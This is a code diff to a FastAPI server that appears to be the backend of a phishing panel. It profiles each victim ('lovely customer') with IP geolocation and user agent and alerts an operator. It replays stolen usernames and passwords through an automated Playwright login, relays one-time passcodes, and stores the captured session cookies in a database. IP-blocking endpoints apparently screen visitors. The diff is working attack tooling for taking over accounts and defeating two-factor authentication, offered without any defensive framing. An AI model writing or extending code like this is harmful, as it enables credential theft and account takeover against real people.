@@ -22,10 +22,10 @@ from fastapi.security import APIKeyHeader
 from utils import messageAdmin, CONFIG, logger, DEBUG
 
 # import modules.auto_login
-from modules.auto_login import auto_login
+from modules.auto_login_playwright import auto_login
 import threading
 from queue import Queue
-
+import base64
 
 AUTO_MODE = False
 
@@ -114,13 +114,38 @@ async def create_lovelyclient(
     broadcast_msg = {"type": "new", "value": id}
     await manager.broadcast(json.dumps(broadcast_msg))
     # TODO: alet admin
-    admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}")
+        ip_stats = r.json()
+        if ip_stats["status"] == "fail":
+            raise
+        admin_message = f"""----\n New lovely customer: :flag-{ip_stats["countryCode"].lower()}: \n ip:{ip} \n id: {id} \n {ip_stats["country"]}, {ip_stats["regionName"]}, {ip_stats["city"]}\n {ip_stats["isp"]}, {ip_stats["org"]} {ip_stats["as"]}\n UserAgent: {user_agent}\n----"""
+    except:
+        admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
+
     # messageAdmin(admin_message)
     messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
     messageadmin_thread.start()
     # await manager
     # return to client success
     return id
+
+
+@app.get("/ipblockcheck")
+def ipBlockCheck(
+    request: Request,
+    db: Session = Depends(get_db),
+    ip_xforwarded: str = Header(None, alias="X-Forwarded-For"),
+):
+    if crud.check_IfIPBlocked(db, ip_xforwarded):
+        return {"stats": "blocked"}
+    return {"stats": "not"}
+
+
+@app.put("/ipblock/{ip}", dependencies=[Depends(get_api_key)])
+def set_ipblock(ip: str, request: Request, db: Session = Depends(get_db)):
+    crud.set_blockIP(db, ip)
+    return {"stats": "OK"}
 
 
 @app.post("/login/{id}")
@@ -171,19 +196,39 @@ def auto_mode_func_listner(q, request, id):
         if curr_msg == None:
             continue
         curr_stat = json.loads(curr_msg)
+
+        if curr_stat["type"] == "noti":
+            messageadmin_thread = threading.Thread(
+                target=messageAdmin, args=(str(curr_stat),)
+            )
+            messageadmin_thread.start()
+
         print(f"[+] current stat is : {curr_stat}")
         if curr_stat["msg"] == "OTP_code":
             set_OPT_abstracted(id=id, OTP=curr_stat["data"])
             set_action_abstracted(id=id, action="OTP")
+        if curr_stat["type"] == "internal":
+            if curr_stat["msg"] == "cookies":
+                db: Session = next(get_db())
+                db_user = crud.set_Cookie(
+                    db, id, base64.b64encode(str(curr_stat["data"]).encode())
+                )
 
 
 def auto_mode_func(q, id, username, password):
-    # while True
     id = str(id)
-    auto_mode = auto_login(q, id, username, password)
-    login_return = json.loads(auto_mode.login())
-    if login_return["msg"] != "OTP_timeout":
-        auto_mode.collect_all()
+    obj = auto_login(q, id, username, password)
+    obj.start_the_action()
+    # while True
+    # auto_mode = auto_login(q, id, username, password)
+    # login_return = json.loads(auto_mode.login())
+    # if login_return["msg"] != "OTP_timeout":
+    #     collected_data = auto_mode.collect_all()
+
+    # # Set the cookie for the user in DB
+    # db: Session = next(get_db())
+    # db_user = crud.set_Cookie(db,id,str(collected_data["cookie"]))
+
     if DEBUG:
         time.sleep(300)  # DEBUG
 
@@ -279,15 +324,16 @@ def get_User(id: int, request: Request, db: Session = Depends(get_db)):
     return db_user
 
 
-@app.put("/automode/{mode}",dependencies=[Depends(get_api_key)])
-def set_automode(mode:str, request: Request,db: Session = Depends(get_db)):
+@app.put("/automode/{mode}", dependencies=[Depends(get_api_key)])
+def set_automode(mode: str, request: Request, db: Session = Depends(get_db)):
     global AUTO_MODE
     # not sure why i didn't with this long code, but i'm lazy to change it
-    if mode == "true" :
+    if mode == "true":
         AUTO_MODE = True
     else:
         AUTO_MODE = False
 
-@app.get("/automode",dependencies=[Depends(get_api_key)])
-def get_automode(request: Request,db: Session = Depends(get_db)):
-    return json.dumps({"automode":str(AUTO_MODE)})
+
+@app.get("/automode", dependencies=[Depends(get_api_key)])
+def get_automode(request: Request, db: Session = Depends(get_db)):
+    return json.dumps({"automode": str(AUTO_MODE)})
